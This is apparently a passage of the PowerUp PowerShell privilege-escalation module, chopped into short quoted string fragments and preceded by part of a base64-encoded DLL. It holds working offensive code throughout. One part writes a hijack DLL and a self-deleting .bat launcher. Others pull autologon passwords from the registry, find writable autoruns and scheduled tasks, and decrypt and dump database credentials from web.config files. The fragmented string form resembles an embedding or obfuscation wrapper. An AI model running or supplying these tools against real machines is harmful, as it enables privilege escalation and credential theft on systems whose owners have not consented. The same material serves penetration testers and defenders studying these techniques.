CAA','AAAAAAAAAAEAAA','AAAABAAkEAABIA','AAAWPAAAFoBAAD','kBAAAAAAAADxhc','3NlbWJseSB4bWx','ucz0idXJuOnNja','GVtYXMtbWljcm9','zb2Z0LWNvbTphc','20udjEiIG1hbml','mZXN0VmVyc2lvb','j0iMS4wIj4NCiA','gPHRydXN0SW5mb','yB4bWxucz0idXJ','uOnNjaGVtYXMtb','Wljcm9zb2Z0LWN','vbTphc20udjMiP','g0KICAgIDxzZWN','1cml0eT4NCiAgI','CAgIDxyZXF1ZXN','0ZWRQcml2aWxlZ','2VzPg0KICAgICA','gICA8cmVxdWVzd','GVkRXhlY3V0aW9','uTGV2ZWwgbGV2Z','Ww9ImFzSW52b2t','lciIgdWlBY2Nlc','3M9ImZhbHNlIj4','8L3JlcXVlc3RlZ','EV4ZWN1dGlvbkx','ldmVsPg0KICAgI','CAgPC9yZXF1ZXN','0ZWRQcml2aWxlZ','2VzPg0KICAgIDw','vc2VjdXJpdHk+D','QogIDwvdHJ1c3R','JbmZvPg0KPC9hc','3NlbWJseT5QQVB','BRERJTkdYWFBBR','ERJTkdQQURESU5','HWFhQQURESU5HU','EFERElOR1hYUEF','ERElOR1BBRERJT','kdYWFBBRERJTkd','QQURESU5HWFhQQ','UQAcAAAIAAAADC','iOKJ4ooCiiKKQo','piisKO4o8Cj4KP','oowCAAAA0AAAAu','KDIoNig6KD4oAi','hGKEooTihSKFYo','WiheKGIoZihqKG','4ocih2KHoofihC','KIAkAAAzAAAAKC','hqKGwobihwKHIo','dCh2KHgoeih8KH','4oQCiCKIQohiiI','KIoojCiOKJAoki','iUKJYomCiaKJwo','niigKKIopCimKK','goqiisKK4osCiy','KLQotii4KLoovC','i+KIAowijEKMYo','yCjKKMwozijQKN','Io1CjWKNgo2ijc','KN4o4CjiKOQo5i','joKOoo7CjuKPAo','8ij0KPYo+Cj6KP','wo/ijAKQIpBCkG','KQgpCikMKQ4pEC','kSKRQpFikYKRop','HCkeKSApIikkKS','YpKCkAAAAsAAAF','AEAABCgOKC4oDC','jOKNAo0ijUKNYo','2CjaKNwo3ijgKO','Io5CjmKOgo6ijs','KO4o8CjyKPQo9i','j4KPoo/Cj+KMAp','AikEKQYpCCkKKQ','wpDikQKRIpFCkW','KRgpGikcKR4pIC','kmKSgpKiksKS4p','MCkyKTQpNik4KT','opPCk+KQApQilE','KUYpSClKKUwpTi','lQKVIpVClWKVgp','WilcKV4pYCliKW','QpZiloKWopbClu','KXApcil0KXYpeC','l6KVYpnimmKa4p','timGKcwpzinQKd','Ip1CnkKsArgiuE','K4YriCuKK4wrji','uQK5IrliuYK5or','nCueK6AroiukK6','YrqCuqK64rsCuy','K7Qrtiu4K7orvC','uAK8IryCvAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAA"

  ','  if ($PSBound','Parameters[''Ar','chitecture'']) ','{
        $Tar','getArchitectur','e = $Architect','ure
    }
    ','elseif ($Env:P','ROCESSOR_ARCHI','TECTURE -eq ''A','MD64'') {
     ','   $TargetArch','itecture = ''x6','4''
    }
    e','lse {
        ','$TargetArchite','cture = ''x86''
','    }

    if ','($TargetArchit','ecture -eq ''x6','4'') {
        ','[Byte[]]$DllBy','tes = [Byte[]]','[Convert]::Fro','mBase64String(','$DllBytes64)
 ','   }
    else ','{
        [Byt','e[]]$DllBytes ','= [Byte[]][Con','vert]::FromBas','e64String($Dll','Bytes32)
    }','

    if ($PSB','oundParameters','[''BatPath'']) {','
        $Targ','etBatPath = $B','atPath
    }
 ','   else {
    ','    $BasePath ','= $DllPath | S','plit-Path -Par','ent
        $T','argetBatPath =',' "$BasePath\de','bug.bat"
    }','

    # patch ','in the appropr','iate .bat laun','cher path
    ','$DllBytes = In','voke-PatchDll ','-DllBytes $Dll','Bytes -SearchS','tring ''debug.b','at'' -ReplaceSt','ring $TargetBa','tPath

    # b','uild the launc','her .bat
    i','f (Test-Path $','TargetBatPath)',' { Remove-Item',' -Force $Targe','tBatPath }

  ','  "@echo off" ','| Out-File -En','coding ASCII -','Append $Target','BatPath
    "s','tart /b $BatCo','mmand" | Out-F','ile -Encoding ','ASCII -Append ','$TargetBatPath','
    ''start /b',' "" cmd /c del',' "%~f0"&exit /','b'' | Out-File ','-Encoding ASCI','I -Append $Tar','getBatPath

  ','  Write-Verbos','e ".bat launch','er written to:',' $TargetBatPat','h"
    Set-Con','tent -Value $D','llBytes -Encod','ing Byte -Path',' $DllPath
    ','Write-Verbose ','"$TargetArchit','ecture DLL Hij','acker written ','to: $DllPath"
','
    $Out = Ne','w-Object PSObj','ect
    $Out |',' Add-Member No','teproperty ''Dl','lPath'' $DllPat','h
    $Out | A','dd-Member Note','property ''Arch','itecture'' $Tar','getArchitectur','e
    $Out | A','dd-Member Note','property ''BatL','auncherPath'' $','TargetBatPath
','    $Out | Add','-Member Notepr','operty ''Comman','d'' $BatCommand','
    $Out.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.Hijackab','leDLL'')
    $O','ut
}


#######','##############','##############','##############','#######
#
# Re','gistry Checks
','#
############','##############','##############','##############','##

function G','et-RegistryAlw','aysInstallElev','ated {
<#
.SYN','OPSIS

Checks ','if any of the ','AlwaysInstallE','levated regist','ry keys are se','t.

Author: Wi','ll Schroeder (','@harmj0y)  
Li','cense: BSD 3-C','lause  
Requir','ed Dependencie','s: None  

.DE','SCRIPTION

Ret','urns $True if ','the HKLM:SOFTW','ARE\Policies\M','icrosoft\Windo','ws\Installer\A','lwaysInstallEl','evated
or the ','HKCU:SOFTWARE\','Policies\Micro','soft\Windows\I','nstaller\Alway','sInstallElevat','ed keys
are se','t, $False othe','rwise. If one ','of these keys ','are set, then ','all .MSI files',' run with
elev','ated permissio','ns, regardless',' of current us','er permissions','.

.EXAMPLE

G','et-RegistryAlw','aysInstallElev','ated

Returns ','$True if any o','f the AlwaysIn','stallElevated ','registry keys ','are set.

.OUT','PUTS

System.B','oolean

$True ','if RegistryAlw','aysInstallElev','ated is set, $','False otherwis','e.
#>

    [Ou','tputType(''Syst','em.Boolean'')]
','    [CmdletBin','ding()]
    Pa','ram()

    $Or','igError = $Err','orActionPrefer','ence
    $Erro','rActionPrefere','nce = ''Silentl','yContinue''

  ','  if (Test-Pat','h ''HKLM:SOFTWA','RE\Policies\Mi','crosoft\Window','s\Installer'') ','{

        $HK','LMval = (Get-I','temProperty -P','ath ''HKLM:SOFT','WARE\Policies\','Microsoft\Wind','ows\Installer''',' -Name AlwaysI','nstallElevated',' -ErrorAction ','SilentlyContin','ue)
        Wr','ite-Verbose "H','KLMval: $($HKL','Mval.AlwaysIns','tallElevated)"','

        if (','$HKLMval.Alway','sInstallElevat','ed -and ($HKLM','val.AlwaysInst','allElevated -n','e 0)){

      ','      $HKCUval',' = (Get-ItemPr','operty -Path ''','HKCU:SOFTWARE\','Policies\Micro','soft\Windows\I','nstaller'' -Nam','e AlwaysInstal','lElevated -Err','orAction Silen','tlyContinue)
 ','           Wri','te-Verbose "HK','CUval: $($HKCU','val.AlwaysInst','allElevated)"
','
            i','f ($HKCUval.Al','waysInstallEle','vated -and ($H','KCUval.AlwaysI','nstallElevated',' -ne 0)){
    ','            Wr','ite-Verbose ''A','lwaysInstallEl','evated enabled',' on this machi','ne!''
         ','       $True
 ','           }
 ','           els','e{
           ','     Write-Ver','bose ''AlwaysIn','stallElevated ','not enabled on',' this machine.','''
            ','    $False
   ','         }
   ','     }
       ',' else{
       ','     Write-Ver','bose ''AlwaysIn','stallElevated ','not enabled on',' this machine.','''
            ','$False
       ',' }
    }
    e','lse{
        W','rite-Verbose ''','HKLM:SOFTWARE\','Policies\Micro','soft\Windows\I','nstaller does ','not exist''
   ','     $False
  ','  }
    $Error','ActionPreferen','ce = $OrigErro','r
}


function',' Get-RegistryA','utoLogon {
<#
','.SYNOPSIS

Fin','ds any autolog','on credentials',' left in the r','egistry.

Auth','or: Will Schro','eder (@harmj0y',')  
License: B','SD 3-Clause  
','Required Depen','dencies: None ',' 

.DESCRIPTIO','N

Checks if a','ny autologon a','ccounts/creden','tials are set ','in a number of',' registry loca','tions.
If they',' are, the cred','entials are ex','tracted and re','turned as a cu','stom PSObject.','

.EXAMPLE

Ge','t-RegistryAuto','Logon

Finds a','ny autologon c','redentials lef','t in the regis','try.

.OUTPUTS','

PowerUp.Regi','stryAutoLogon
','
Custom PSObje','ct containing ','autologin cred','entials found ','in the registr','y.

.LINK

htt','ps://github.co','m/rapid7/metas','ploit-framewor','k/blob/master/','modules/post/w','indows/gather/','credentials/wi','ndows_autologi','n.rb
#>

    [','OutputType(''Po','werUp.Registry','AutoLogon'')]
 ','   [CmdletBind','ing()]
    Par','am()

    $Aut','oAdminLogon = ','$(Get-ItemProp','erty -Path "HK','LM:SOFTWARE\Mi','crosoft\Window','s NT\CurrentVe','rsion\Winlogon','" -Name AutoAd','minLogon -Erro','rAction Silent','lyContinue)
  ','  Write-Verbos','e "AutoAdminLo','gon key: $($Au','toAdminLogon.A','utoAdminLogon)','"

    if ($Au','toAdminLogon -','and ($AutoAdmi','nLogon.AutoAdm','inLogon -ne 0)',') {

        $','DefaultDomainN','ame = $(Get-It','emProperty -Pa','th "HKLM:SOFTW','ARE\Microsoft\','Windows NT\Cur','rentVersion\Wi','nlogon" -Name ','DefaultDomainN','ame -ErrorActi','on SilentlyCon','tinue).Default','DomainName
   ','     $DefaultU','serName = $(Ge','t-ItemProperty',' -Path "HKLM:S','OFTWARE\Micros','oft\Windows NT','\CurrentVersio','n\Winlogon" -N','ame DefaultUse','rName -ErrorAc','tion SilentlyC','ontinue).Defau','ltUserName
   ','     $DefaultP','assword = $(Ge','t-ItemProperty',' -Path "HKLM:S','OFTWARE\Micros','oft\Windows NT','\CurrentVersio','n\Winlogon" -N','ame DefaultPas','sword -ErrorAc','tion SilentlyC','ontinue).Defau','ltPassword
   ','     $AltDefau','ltDomainName =',' $(Get-ItemPro','perty -Path "H','KLM:SOFTWARE\M','icrosoft\Windo','ws NT\CurrentV','ersion\Winlogo','n" -Name AltDe','faultDomainNam','e -ErrorAction',' SilentlyConti','nue).AltDefaul','tDomainName
  ','      $AltDefa','ultUserName = ','$(Get-ItemProp','erty -Path "HK','LM:SOFTWARE\Mi','crosoft\Window','s NT\CurrentVe','rsion\Winlogon','" -Name AltDef','aultUserName -','ErrorAction Si','lentlyContinue',').AltDefaultUs','erName
       ',' $AltDefaultPa','ssword = $(Get','-ItemProperty ','-Path "HKLM:SO','FTWARE\Microso','ft\Windows NT\','CurrentVersion','\Winlogon" -Na','me AltDefaultP','assword -Error','Action Silentl','yContinue).Alt','DefaultPasswor','d

        if ','($DefaultUserN','ame -or $AltDe','faultUserName)',' {
           ',' $Out = New-Ob','ject PSObject
','            $O','ut | Add-Membe','r Noteproperty',' ''DefaultDomai','nName'' $Defaul','tDomainName
  ','          $Out',' | Add-Member ','Noteproperty ''','DefaultUserNam','e'' $DefaultUse','rName
        ','    $Out | Add','-Member Notepr','operty ''Defaul','tPassword'' $De','faultPassword
','            $O','ut | Add-Membe','r Noteproperty',' ''AltDefaultDo','mainName'' $Alt','DefaultDomainN','ame
          ','  $Out | Add-M','ember Noteprop','erty ''AltDefau','ltUserName'' $A','ltDefaultUserN','ame
          ','  $Out | Add-M','ember Noteprop','erty ''AltDefau','ltPassword'' $A','ltDefaultPassw','ord
          ','  $Out.PSObjec','t.TypeNames.In','sert(0, ''Power','Up.RegistryAut','oLogon'')
     ','       $Out
  ','      }
    }
','}

function Ge','t-ModifiableRe','gistryAutoRun ','{
<#
.SYNOPSIS','

Returns any ','elevated syste','m autoruns in ','which the curr','ent user can
m','odify part of ','the path strin','g.

Author: Wi','ll Schroeder (','@harmj0y)  
Li','cense: BSD 3-C','lause  
Requir','ed Dependencie','s: Get-Modifia','blePath  

.DE','SCRIPTION

Enu','merates a numb','er of autorun ','specifications',' in HKLM and f','ilters any
aut','oruns through ','Get-Modifiable','Path, returnin','g any file/con','fig locations
','in the found p','ath strings th','at the current',' user can modi','fy.

.EXAMPLE
','
Get-Modifiabl','eRegistryAutoR','un

Return vul','neable autorun',' binaries (or ','associated con','figs).

.OUTPU','TS

PowerUp.Mo','difiableRegist','ryAutoRun

Cus','tom PSObject c','ontaining resu','lts.
#>

    [','Diagnostics.Co','deAnalysis.Sup','pressMessageAt','tribute(''PSSho','uldProcess'', ''',''')]
    [Outpu','tType(''PowerUp','.ModifiableReg','istryAutoRun'')',']
    [CmdletB','inding()]
    ','Param()

    $','SearchLocation','s = @(   "HKLM',':\SOFTWARE\Mic','rosoft\Windows','\CurrentVersio','n\Run",
      ','              ','        "HKLM:','\Software\Micr','osoft\Windows\','CurrentVersion','\RunOnce",
   ','              ','           "HK','LM:\SOFTWARE\W','ow6432Node\Mic','rosoft\Windows','\CurrentVersio','n\Run",
      ','              ','        "HKLM:','\SOFTWARE\Wow6','432Node\Micros','oft\Windows\Cu','rrentVersion\R','unOnce",
     ','              ','         "HKLM',':\SOFTWARE\Mic','rosoft\Windows','\CurrentVersio','n\RunService",','
             ','              ',' "HKLM:\SOFTWA','RE\Microsoft\W','indows\Current','Version\RunOnc','eService",
   ','              ','           "HK','LM:\SOFTWARE\W','ow6432Node\Mic','rosoft\Windows','\CurrentVersio','n\RunService",','
             ','              ',' "HKLM:\SOFTWA','RE\Wow6432Node','\Microsoft\Win','dows\CurrentVe','rsion\RunOnceS','ervice"
      ','              ','    )

    $Or','igError = $Err','orActionPrefer','ence
    $Erro','rActionPrefere','nce = "Silentl','yContinue"

  ','  $SearchLocat','ions | Where-O','bject { Test-P','ath $_ } | For','Each-Object {
','
        $Keys',' = Get-Item -P','ath $_
       ',' $ParentPath =',' $_

        F','orEach ($Name ','in $Keys.GetVa','lueNames()) {
','
            $','Path = $($Keys','.GetValue($Nam','e))

         ','   $Path | Get','-ModifiablePat','h | ForEach-Ob','ject {
       ','         $Out ','= New-Object P','SObject
      ','          $Out',' | Add-Member ','Noteproperty ''','Key'' "$ParentP','ath\$Name"
   ','             $','Out | Add-Memb','er Notepropert','y ''Path'' $Path','
             ','   $Out | Add-','Member Notepro','perty ''Modifia','bleFile'' $_
  ','              ','$Out | Add-Mem','ber Aliasprope','rty Name Key
 ','              ',' $Out.PSObject','.TypeNames.Ins','ert(0, ''PowerU','p.ModifiableRe','gistryAutoRun''',')
            ','    $Out
     ','       }
     ','   }
    }

  ','  $ErrorAction','Preference = $','OrigError
}


','##############','##############','##############','##############','
#
# Miscellan','eous checks
#
','##############','##############','##############','##############','

function Get','-ModifiableSch','eduledTaskFile',' {
<#
.SYNOPSI','S

Returns sch','eduled tasks w','here the curre','nt user can mo','dify any file
','in the associa','ted task actio','n string.

Aut','hor: Will Schr','oeder (@harmj0','y)  
License: ','BSD 3-Clause  ','
Required Depe','ndencies: Get-','ModifiablePath','  

.DESCRIPTI','ON

Enumerates',' all scheduled',' tasks by recu','rsively listin','g "$($ENV:wind','ir)\System32\T','asks"
and pars','es the XML spe','cification for',' each task, ex','tracting the c','ommand trigger','s.
Each trigge','r string is fi','ltered through',' Get-Modifiabl','ePath, returni','ng any file/co','nfig
locations',' in the found ','path strings t','hat the curren','t user can mod','ify.

.EXAMPLE','

Get-Modifiab','leScheduledTas','kFile

Return ','scheduled task','s with modifia','ble command st','rings.

.OUTPU','TS

PowerUp.Mo','difiableSchedu','ledTaskFile

C','ustom PSObject',' containing re','sults.
#>

   ',' [Diagnostics.','CodeAnalysis.S','uppressMessage','Attribute(''PSS','houldProcess'',',' '''')]
    [Out','putType(''Power','Up.ModifiableS','cheduledTaskFi','le'')]
    [Cmd','letBinding()]
','    Param()

 ','   $OrigError ','= $ErrorAction','Preference
   ',' $ErrorActionP','reference = "S','ilentlyContinu','e"

    $Path ','= "$($ENV:wind','ir)\System32\T','asks"

    # r','ecursively enu','merate all sch','task .xmls
   ',' Get-ChildItem',' -Path $Path -','Recurse | Wher','e-Object { -no','t $_.PSIsConta','iner } | ForEa','ch-Object {
  ','      try {
  ','          $Tas','kName = $_.Nam','e
            ','$TaskXML = [xm','l] (Get-Conten','t $_.FullName)','
            i','f ($TaskXML.Ta','sk.Triggers) {','

            ','    $TaskTrigg','er = $TaskXML.','Task.Triggers.','OuterXML

    ','            # ','check schtask ','command
      ','          $Tas','kXML.Task.Acti','ons.Exec.Comma','nd | Get-Modif','iablePath | Fo','rEach-Object {','
             ','       $Out = ','New-Object PSO','bject
        ','            $O','ut | Add-Membe','r Noteproperty',' ''TaskName'' $T','askName
      ','              ','$Out | Add-Mem','ber Noteproper','ty ''TaskFilePa','th'' $_
       ','             $','Out | Add-Memb','er Notepropert','y ''TaskTrigger',''' $TaskTrigger','
             ','       $Out | ','Add-Member Ali','asproperty Nam','e TaskName
   ','              ','   $Out.PSObje','ct.TypeNames.I','nsert(0, ''Powe','rUp.Modifiable','ScheduledTaskF','ile'')
        ','            $O','ut
           ','     }

      ','          # ch','eck schtask ar','guments
      ','          $Tas','kXML.Task.Acti','ons.Exec.Argum','ents | Get-Mod','ifiablePath | ','ForEach-Object',' {
           ','         $Out ','= New-Object P','SObject
      ','              ','$Out | Add-Mem','ber Noteproper','ty ''TaskName'' ','$TaskName
    ','              ','  $Out | Add-M','ember Noteprop','erty ''TaskFile','Path'' $_
     ','              ',' $Out | Add-Me','mber Noteprope','rty ''TaskTrigg','er'' $TaskTrigg','er
           ','         $Out ','| Add-Member A','liasproperty N','ame TaskName
 ','              ','     $Out.PSOb','ject.TypeNames','.Insert(0, ''Po','werUp.Modifiab','leScheduledTas','kFile'')
      ','              ','$Out
         ','       }
     ','       }
     ','   }
        c','atch {
       ','     Write-Ver','bose "Error: $','_"
        }
 ','   }
    $Erro','rActionPrefere','nce = $OrigErr','or
}


functio','n Get-Unattend','edInstallFile ','{
<#
.SYNOPSIS','

Checks sever','al locations f','or remaining u','nattended inst','allation files',',
which may ha','ve deployment ','credentials.

','Author: Will S','chroeder (@har','mj0y)  
Licens','e: BSD 3-Claus','e  
Required D','ependencies: N','one  

.EXAMPL','E

Get-Unatten','dedInstallFile','

Finds any re','maining unatte','nded installat','ion files.

.L','INK

http://ww','w.fuzzysecurit','y.com/tutorial','s/16.html

.OU','TPUTS

PowerUp','.UnattendedIns','tallFile

Cust','om PSObject co','ntaining resul','ts.
#>

    [D','iagnostics.Cod','eAnalysis.Supp','ressMessageAtt','ribute(''PSShou','ldProcess'', ''''',')]
    [Output','Type(''PowerUp.','UnattendedInst','allFile'')]
   ',' [CmdletBindin','g()]
    Param','()

    $OrigE','rror = $ErrorA','ctionPreferenc','e
    $ErrorAc','tionPreference',' = "SilentlyCo','ntinue"

    $','SearchLocation','s = @(   "c:\s','ysprep\sysprep','.xml",
       ','              ','       "c:\sys','prep\sysprep.i','nf",
         ','              ','     "c:\syspr','ep.inf",
     ','              ','         (Join','-Path $Env:Win','Dir "\Panther\','Unattended.xml','"),
          ','              ','    (Join-Path',' $Env:WinDir "','\Panther\Unatt','end\Unattended','.xml"),
      ','              ','        (Join-','Path $Env:WinD','ir "\Panther\U','nattend.xml"),','
             ','              ',' (Join-Path $E','nv:WinDir "\Pa','nther\Unattend','\Unattend.xml"','),
           ','              ','   (Join-Path ','$Env:WinDir "\','System32\Syspr','ep\unattend.xm','l"),
         ','              ','     (Join-Pat','h $Env:WinDir ','"\System32\Sys','prep\Panther\u','nattend.xml")
','              ','          )

 ','   # test the ','existence of e','ach path and r','eturn anything',' found
    $Se','archLocations ','| Where-Object',' { Test-Path $','_ } | ForEach-','Object {
     ','   $Out = New-','Object PSObjec','t
        $Out',' | Add-Member ','Noteproperty ''','UnattendPath'' ','$_
        $Ou','t | Add-Member',' Aliasproperty',' Name Unattend','Path
        $','Out.PSObject.T','ypeNames.Inser','t(0, ''PowerUp.','UnattendedInst','allFile'')
    ','    $Out
    }','

    $ErrorAc','tionPreference',' = $OrigError
','}


function G','et-WebConfig {','
<#
.SYNOPSIS
','
This script w','ill recover cl','eartext and en','crypted connec','tion strings f','rom all web.co','nfig
files on ','the system. Al','so, it will de','crypt them if ','needed.

Autho','r: Scott Suthe','rland, Antti R','antasaari  
Li','cense: BSD 3-C','lause  
Requir','ed Dependencie','s: None  

.DE','SCRIPTION

Thi','s script will ','identify all o','f the web.conf','ig files on th','e system and r','ecover the
con','nection string','s used to supp','ort authentica','tion to backen','d databases.  ','If needed, the','
script will a','lso decrypt th','e connection s','trings on the ','fly.  The outp','ut supports th','e
pipeline whi','ch can be used',' to convert al','l of the resul','ts into a pret','ty table by pi','ping
to format','-table.

.EXAM','PLE

Return a ','list of cleart','ext and decryp','ted connect st','rings from web','.config files.','

Get-WebConfi','g

user   : s1','admin
pass   :',' s1password
db','serv : 192.168','.1.103\server1','
vdir   : C:\t','est2
path   : ','C:\test2\web.c','onfig
encr   :',' No

user   : ','s1user
pass   ',': s1password
d','bserv : 192.16','8.1.103\server','1
vdir   : C:\','inetpub\wwwroo','t
path   : C:\','inetpub\wwwroo','t\web.config
e','ncr   : Yes

.','EXAMPLE

Retur','n a list of cl','ear text and d','ecrypted conne','ct strings fro','m web.config f','iles.

Get-Web','Config | Forma','t-Table -Autos','ize

user    p','ass       dbse','rv            ','    vdir      ','         path ','              ','           enc','r
----    ----','       ------ ','              ',' ----         ','      ----    ','              ','        ----
s','1admin s1passw','ord 192.168.1.','101\server1 C:','\App1         ','   C:\App1\web','.config       ','     No
s1user','  s1password 1','92.168.1.101\s','erver1 C:\inet','pub\wwwroot C:','\inetpub\wwwro','ot\web.config ','No
s2user  s2p','assword 192.16','8.1.102\server','2 C:\App2     ','       C:\App2','\test\web.conf','ig       No
s2','user  s2passwo','rd 192.168.1.1','02\server2 C:\','App2          ','  C:\App2\web.','config        ','    Yes
s3user','  s3password 1','92.168.1.103\s','erver3 D:\App3','            D:','\App3\web.conf','ig            ','No

.OUTPUTS

','System.Boolean','

System.Data.','DataTable

.LI','NK

https://gi','thub.com/darko','perator/Posh-S','ecMod/blob/mas','ter/PostExploi','tation/PostExp','loitation.psm1','
http://www.ne','tspi.com
https','://raw2.github','.com/NetSPI/cm','dsql/master/cm','dsql.aspx
http','://www.iis.net','/learn/get-sta','rted/getting-s','tarted-with-ii','s/getting-star','ted-with-appcm','dexe
http://ms','dn.microsoft.c','om/en-us/libra','ry/k6h9cz8h(v=','vs.80).aspx

.','NOTES

Below i','s an alteranti','ve method for ','grabbing conne','ction strings,',' but it doesn''','t support decr','yption.
for /f',' "tokens=*" %i',' in (''%systemr','oot%\system32\','inetsrv\appcmd','.exe list site','s /text:name'')',' do %systemroo','t%\system32\in','etsrv\appcmd.e','xe list config',' "%i" -section',':connectionstr','ings

Author: ','Scott Sutherla','nd - 2014, Net','SPI
Author: An','tti Rantasaari',' - 2014, NetSP','I
#>

    [Dia','gnostics.CodeA','nalysis.Suppre','ssMessageAttri','bute(''PSShould','Process'', '''')]','
    [Diagnost','ics.CodeAnalys','is.SuppressMes','sageAttribute(','''PSAvoidUsingI','nvokeExpressio','n'', '''')]
    [','OutputType(''Sy','stem.Boolean'')',']
    [OutputT','ype(''System.Da','ta.DataTable'')',']
    [CmdletB','inding()]
    ','Param()

    $','OrigError = $E','rrorActionPref','erence
    $Er','rorActionPrefe','rence = ''Silen','tlyContinue''

','    # Check if',' appcmd.exe ex','ists
    if (T','est-Path  ("$E','nv:SystemRoot\','System32\InetS','RV\appcmd.exe"',')) {

        ','# Create data ','table to house',' results
     ','   $DataTable ','= New-Object S','ystem.Data.Dat','aTable

      ','  # Create and',' name columns ','in the data ta','ble
        $N','ull = $DataTab','le.Columns.Add','(''user'')
     ','   $Null = $Da','taTable.Column','s.Add(''pass'')
','        $Null ','= $DataTable.C','olumns.Add(''db','serv'')
       ',' $Null = $Data','Table.Columns.','Add(''vdir'')
  ','      $Null = ','$DataTable.Col','umns.Add(''path',''')
        $Nu','ll = $DataTabl','e.Columns.Add(','''encr'')

     ','   # Get list ','of virtual dir','ectories in II','S
        C:\W','indows\System3','2\InetSRV\appc','md.exe list vd','ir /text:physi','calpath |
    ','    ForEach-Ob','ject {

      ','      $Current','Vdir = $_

   ','         # Con','verts CMD styl','e env vars (%)',' to powershell',' env vars (env',')
            ','if ($_ -like "','*%*") {
      ','          $Env','arName = "`$En','v:"+$_.split("','%")[1]
       ','         $Enva','rValue = Invok','e-Expression $','EnvarName
    ','            $R','estofPath = $_','.split(''%'')[2]','
             ','   $CurrentVdi','r  = $EnvarVal','ue+$RestofPath','
            }','

            ','# Search for w','eb.config file','s in each virt','ual directory
','            $C','urrentVdir | G','et-ChildItem -','Recurse -Filte','r web.config |',' ForEach-Objec','t {

         ','       # Set w','eb.config path','
             ','   $CurrentPat','h = $_.fullnam','e

           ','     # Read th','e data from th','e web.config x','ml file
      ','          [xml',']$ConfigFile =',' Get-Content $','_.fullname

  ','              ','# Check if the',' connectionStr','ings are encry','pted
         ','       if ($Co','nfigFile.confi','guration.conne','ctionStrings.a','dd) {

       ','             #',' Foreach conne','ction string a','dd to data tab','le
           ','         $Conf','igFile.configu','ration.connect','ionStrings.add','|
            ','        ForEac','h-Object {

  ','              ','        [Strin','g]$MyConString',' = $_.connecti','onString
     ','              ','     if ($MyCo','nString -like ','''*password*'') ','{
            ','              ','  $ConfUser = ','$MyConString.S','plit(''='')[3].S','plit('';'')[0]
 ','              ','             $','ConfPass = $My','ConString.Spli','t(''='')[4].Spli','t('';'')[0]
    ','              ','          $Con','fServ = $MyCon','String.Split(''','='')[1].Split(''',';'')[0]
       ','              ','       $ConfVd','ir = $CurrentV','dir
          ','              ','    $ConfEnc =',' ''No''
        ','              ','      $Null = ','$DataTable.Row','s.Add($ConfUse','r, $ConfPass, ','$ConfServ, $Co','nfVdir, $Curre','ntPath, $ConfE','nc)
          ','              ','}
            ','        }
    ','            }
','              ','  else {

    ','              ','  # Find newes','t version of a','spnet_regiis.e','xe to use (it ','works with old','er versions)
 ','              ','     $AspnetRe','giisPath = Get','-ChildItem -Pa','th "$Env:Syste','mRoot\Microsof','t.NET\Framewor','k\" -Recurse -','filter ''aspnet','_regiis.exe''  ','| Sort-Object ','-Descending | ','Select-Object ','fullname -Firs','t 1

         ','           # C','heck if aspnet','_regiis.exe ex','ists
         ','           if ','(Test-Path  ($','AspnetRegiisPa','th.FullName)) ','{

           ','             #',' Setup path fo','r temp web.con','fig to the cur','rent user''s te','mp dir
       ','              ','   $WebConfigP','ath = (Get-Ite','m $Env:temp).F','ullName + ''\we','b.config''

   ','              ','       # Remov','e existing tem','p web.config
 ','              ','         if (T','est-Path  ($We','bConfigPath)) ','{
            ','              ','  Remove-Item ','$WebConfigPath','
             ','           }

','              ','          # Co','py web.config ','from vdir to u','ser temp for d','ecryption
    ','              ','      Copy-Ite','m $CurrentPath',' $WebConfigPat','h

           ','             #',' Decrypt web.c','onfig in user ','temp
         ','              ',' $AspnetRegiis','Cmd = $AspnetR','egiisPath.full','name+'' -pdf "c','onnectionStrin','gs" (get-item ','$Env:temp).Ful','lName''
       ','              ','   $Null = Inv','oke-Expression',' $AspnetRegiis','Cmd

         ','              ',' # Read the da','ta from the we','b.config in te','mp
           ','             [','xml]$TMPConfig','File = Get-Con','tent $WebConfi','gPath

       ','              ','   # Check if ','the connection','Strings are st','ill encrypted
','              ','          if (','$TMPConfigFile','.configuration','.connectionStr','ings.add) {

 ','              ','             #',' Foreach conne','ction string a','dd to data tab','le
           ','              ','   $TMPConfigF','ile.configurat','ion.connection','Strings.add | ','ForEach-Object',' {

          ','              ','        [Strin','g]$MyConString',' = $_.connecti','onString
     ','              ','             i','f ($MyConStrin','g -like ''*pass','word*'') {
    ','              ','              ','    $ConfUser ','= $MyConString','.Split(''='')[3]','.Split('';'')[0]','
             ','              ','         $Conf','Pass = $MyConS','tring.Split(''=',''')[4].Split('';',''')[0]
        ','              ','              ','$ConfServ = $M','yConString.Spl','it(''='')[1].Spl','it('';'')[0]
   ','              ','              ','     $ConfVdir',' = $CurrentVdi','r
            ','              ','          $Con','fEnc = ''Yes''
 ','              ','              ','       $Null =',' $DataTable.Ro','ws.Add($ConfUs','er, $ConfPass,',' $ConfServ, $C','onfVdir, $Curr','entPath, $Conf','Enc)
         ','              ','         }
   ','              ','           }
 ','              ','         }
   ','              ','       else {
','              ','              ','Write-Verbose ','"Decryption of',' $CurrentPath ','failed."
     ','              ','         $Fals','e
            ','            }
','              ','      }
      ','              ','else {
       ','              ','   Write-Verbo','se ''aspnet_reg','iis.exe does n','ot exist in th','e default loca','tion.''
       ','              ','   $False
    ','              ','  }
          ','      }
      ','      }
      ','  }

